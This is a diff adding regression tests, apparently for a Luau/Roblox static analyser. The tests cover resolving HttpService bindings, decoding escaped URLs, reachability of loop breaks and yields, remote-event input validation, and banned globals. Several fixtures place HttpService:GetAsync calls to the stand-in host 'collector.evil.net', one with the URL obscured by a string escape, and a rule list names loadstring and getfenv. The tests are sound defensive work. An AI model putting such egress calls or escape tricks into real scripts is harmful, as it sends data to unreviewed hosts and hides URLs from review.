@@ -347,3 +347,240 @@ describe('fail-closed regressions', () => {
     expect(analyse(source)).toEqual({ status: 'ok', findings: [] });
   });
 });
+
+/**
+ * Round three of the same exercise. These are not fail-open bypasses — the
+ * receiver guard above already closed those — but they are the next layer down:
+ * a rule that fires with the *wrong severity*, a rule silenced by a token the
+ * script never runs, a rule whose guard range swallows a statement it was never
+ * asked about. Each one below is paired with the legitimate shape it is most
+ * easily confused with, because a fix that turns a false negative into a false
+ * positive has moved the problem rather than solved it.
+ */
+describe('binding, reachability and decoding regressions', () => {
+  const ALLOW: AnalyseOptions = { allowedHttpHosts: ['api.example.com'] };
+
+  it('resolves a service bound with a type annotation or in a multi-value assignment', () => {
+    // The walk-back assumed the token before `=` was the bound name. With an
+    // annotation it found the TYPE; with a second target it found a comma. Both
+    // left `H` unknown, so the call fell to the unresolved-receiver branch — a
+    // warning that says "cannot tell", where an error naming the host belongs.
+    const annotated = analyse(
+      'local H: HttpService = game:GetService("HttpService")\nH:GetAsync("https://collector.evil.net/x")\n',
+      ALLOW,
+    );
+    expect(annotated.status).toBe('fail');
+    expect(annotated.findings[0]?.message).toContain('collector.evil.net');
+
+    const multiple = analyse(
+      'local retries, H = 3, game:GetService("HttpService")\nprint(retries)\nH:GetAsync("https://collector.evil.net/x")\n',
+      ALLOW,
+    );
+    expect(multiple.status).toBe('fail');
+    expect(multiple.findings[0]?.message).toContain('collector.evil.net');
+  });
+
+  it('does not bind a name to a service the statement before it fetched', () => {
+    // The control for the walk-back. Reading past the start of the statement
+    // would make `store` an HttpService name and report a DataStore call as
+    // egress to a host it never reaches.
+    const source = [
+      'local store = DataStoreService:GetDataStore("s")',
+      'game:GetService("HttpService")',
+      'local value = store:GetAsync("k")',
+      'print(value)',
+      '',
+    ].join('\n');
+    const result = analyse(source, ALLOW);
+    // The bare service lookup means this source does touch HttpService, so the
+    // unresolved receiver still warns — but nothing claims `store` is the service.
+    expect(result.status).toBe('warn');
+    expect(result.findings.every((finding) => !finding.message.includes('reaches'))).toBe(true);
+  });
+
+  it('reads a URL hidden behind string escapes', () => {
+    // `"\104ttps://evil.com"` is `https://evil.com` to the Luau VM. The decoder
+    // dropped the backslash and kept the first character, so the rule saw
+    // `104ttps://evil.com`, could not read a host out of it, and warned about an
+    // unreadable string instead of naming the host it really reaches.
+    const head = 'local H = game:GetService("HttpService")\n';
+    const result = analyse(`${head}H:GetAsync("\\104ttps://collector.evil.net/x")\n`, ALLOW);
+    expect(result.status).toBe('fail');
+    expect(result.findings[0]?.message).toContain('collector.evil.net');
+  });
+
+  it('still passes an allowed host written with escapes, and a wrapped one', () => {
+    // The control for the decoder: it has to be right in both directions, or it
+    // reports the project's own endpoint as an unreviewed host.
+    const head = 'local H = game:GetService("HttpService")\n';
+    expect(analyse(`${head}print(H:GetAsync("https://api.example.com/v1\\x2Fitems"))\n`, ALLOW)).toEqual({
+      status: 'ok',
+      findings: [],
+    });
+    expect(analyse(`${head}print(H:GetAsync("https://api.example.com/\\z\n      v1/items"))\n`, ALLOW)).toEqual({
+      status: 'ok',
+      findings: [],
+    });
+  });
+
+  it('reads every literal that never ends a loop, not only the keyword `true`', () => {
+    // Every value but `false` and `nil` is truthy in Luau, so each of these
+    // spins exactly as hard as `while true do` and hangs Studio the same way.
+    only('local total = 0\nwhile 1 do\n  total = total + 1\nend\n', 'luau/while-true-no-yield');
+    only('local total = 0\nwhile ((true)) do\n  total = total + 1\nend\n', 'luau/while-true-no-yield');
+    only('while "spin" do\n  step()\nend\n', 'luau/while-true-no-yield');
+    only('repeat\n  step()\nuntil nil\n', 'luau/while-true-no-yield');
+  });
+
+  it('does not read a real condition as a literal', () => {
+    // The control. A loop with a condition is a loop that can end, and flagging
+    // one is how this rule would get switched off in a project's config.
+    const sources = [
+      'while ready do\n  step()\nend\n',
+      'while count > 0 do\n  count -= 1\nend\n',
+      'repeat\n  step()\nuntil false or done\n',
+      'repeat\n  step()\nuntil finished\n',
+    ];
+    for (const source of sources) {
+      expect(analyse(source), source).toEqual({ status: 'ok', findings: [] });
+    }
+  });
+
+  it('does not let a yield that cannot run silence the freeze', () => {
+    // Same reason as the `break` below: a `task.wait()` behind a literal `false`
+    // never runs, so the loop still never gives the scheduler a turn.
+    only('while true do\n  if false then task.wait(1) end\n  step()\nend\n', 'luau/while-true-no-yield');
+  });
+
+  it('does not let a `break` that cannot run silence the freeze', () => {
+    // `if false then break end` is valid Luau that never breaks, and a `break`
+    // inside a closure belongs to no loop at all. Either one counted, and a loop
+    // that hangs Studio for ever was reported as one that can leave.
+    only('while true do\n  if false then break end\n  step()\nend\n', 'luau/while-true-no-yield');
+    only('while true do\n  if nil then return end\n  step()\nend\n', 'luau/while-true-no-yield');
+    only('while true do\n  local f = function() break end\n  step(f)\nend\n', 'luau/while-true-no-yield');
+    // And the branch stays dead when an if-*expression* is written inside it:
+    // its `then`/`else` are part of a value, not the start of another arm.
+    only(
+      'while true do\n  if false then\n    local label = if fast then "a" else "b"\n    step(label)\n    break\n  end\n  step()\nend\n',
+      'luau/while-true-no-yield',
+    );
+  });
+
+  it('still counts a `break` that can run, including one in an `else`', () => {
+    // The control for reachability. The `else` of a branch that never runs is a
+    // branch that always runs, and the ordinary guarded `break` is the shape
+    // this rule must never fire on.
+    const sources = [
+      'while true do\n  if finished then break end\n  step()\nend\n',
+      'while true do\n  if false then step() else break end\nend\n',
+      'while true do\n  if ready then return end\n  step()\nend\n',
+    ];
+    for (const source of sources) {
+      expect(analyse(source), source).toEqual({ status: 'ok', findings: [] });
+    }
+  });
+
+  it('does not accept a mention of `task.wait` as a yield', () => {
+    // Naming the function is not calling it. This loop never gives the
+    // scheduler a turn, and matching the name alone reported it as safe.
+    only('while true do\n  local resume = task.wait\n  step(resume)\nend\n', 'luau/while-true-no-yield');
+  });
+
+  it('still accepts an actual yield, however it is spelled', () => {
+    // The control: the calls this rule exists to find must keep clearing it.
+    const sources = [
+      'while true do\n  task.wait(1)\n  step()\nend\n',
+      'while true do\n  RunService.Heartbeat:Wait()\n  step()\nend\n',
+      'while true do\n  coroutine.yield()\n  step()\nend\n',
+    ];
+    for (const source of sources) {
+      expect(analyse(source), source).toEqual({ status: 'ok', findings: [] });
+    }
+  });
+
+  it('sees a per-frame handler connected through a local', () => {
+    // The rule required the literal run `.Heartbeat:Connect(function`, so one
+    // intervening local turned it off — and binding the signal first is ordinary
+    // code, not evasion.
+    const source = [
+      'local RunService = game:GetService("RunService")',
+      'local heartbeat = RunService.Heartbeat',
+      'heartbeat:Connect(function()',
+      '  while queue.count > 0 do',
+      '    process(queue)',
+      '  end',
+      'end)',
+      '',
+    ].join('\n');
+    expect(rules(source)).toEqual(['luau/unbounded-heartbeat']);
+  });
+
+  it('does not treat every local signal as a per-frame one', () => {
+    // The control. `Touched` fires when something touches a part, not once a
+    // frame, and a loop in its handler is nobody's emergency.
+    const source = [
+      'local touched = part.Touched',
+      'touched:Connect(function()',
+      '  while queue.count > 0 do',
+      '    process(queue)',
+      '  end',
+      'end)',
+      '',
+    ].join('\n');
+    expect(analyse(source)).toEqual({ status: 'ok', findings: [] });
+  });
+
+  it('stops an `until` guard at the end of the condition', () => {
+    // `until` has no terminator, so the guard range ran on into the statements
+    // after the loop and counted `amount` as tested when nothing had tested it.
+    const source = [
+      'local Remotes = game:GetService("ReplicatedStorage").Remotes',
+      'Remotes.GiveCash.OnServerEvent:Connect(function(player, amount)',
+      '  repeat',
+      '    step()',
+      '  until done',
+      '  player.leaderstats.Cash.Value += amount',
+      'end)',
+      '',
+    ].join('\n');
+    expect(rules(source)).toEqual(['luau/remote-no-validation']);
+  });
+
+  it('still accepts an `until` that really does test the value', () => {
+    // The control: `until` is a place a value gets tested, and the range has to
+    // keep covering the condition itself.
+    const source = [
+      'local Remotes = game:GetService("ReplicatedStorage").Remotes',
+      'Remotes.GiveCash.OnServerEvent:Connect(function(player, amount)',
+      '  repeat',
+      '    step()',
+      '  until amount > 0',
+      '  player.leaderstats.Cash.Value += 1',
+      'end)',
+      '',
+    ].join('\n');
+    expect(analyse(source)).toEqual({ status: 'ok', findings: [] });
+  });
+
+  it('does not report a declaration that shadows a banned global', () => {
+    // Only the first name in a list was recognised as a declaration, so the very
+    // line that takes the global out of scope was reported as a use of it — in a
+    // `local` list, in a parameter list, and past a type annotation.
+    expect(analyse('local a, loadstring, b = 1, 2, 3\nprint(a, b)\n')).toEqual({ status: 'ok', findings: [] });
+    expect(analyse('local function handler(player, loadstring)\n  return player\nend\nprint(handler)\n')).toEqual({
+      status: 'ok',
+      findings: [],
+    });
+    expect(analyse('local retries: number, getfenv: any = 3, nil\nprint(retries)\n')).toEqual({
+      status: 'ok',
+      findings: [],
+    });
+  });
+
+  it('still reports the global itself', () => {
+    // The control for the declaration walk: widening it must not swallow a call.
+    only('local compiled = loadstring("print(1)")\nprint(compiled)\n', 'luau/no-loadstring');
+    expect(rules('local n = 1\nspawn(function() end)\n')).toEqual(['luau/deprecated-wait-spawn']);
+  });
+});
